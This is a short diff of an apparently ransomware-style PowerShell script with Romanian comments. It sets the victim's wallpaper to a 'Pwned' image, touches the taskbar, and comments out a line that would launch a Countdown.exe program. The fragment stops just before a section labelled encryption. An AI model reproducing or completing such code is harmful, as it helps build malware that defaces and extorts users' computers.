@@ -66,7 +66,7 @@ $taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
 [Wallpaper]::SystemParametersInfo(20, 0, "$env:USERPROFILE\Desktop\Pwned.png" , 3)
 
 # Acceseaza Countdown.exe
-Invoke-Item "$env:USERPROFILE\Desktop\Countdown.exe"
+#Invoke-Item "$env:USERPROFILE\Desktop\Countdown.exe"
 
 ##Encriptie
 
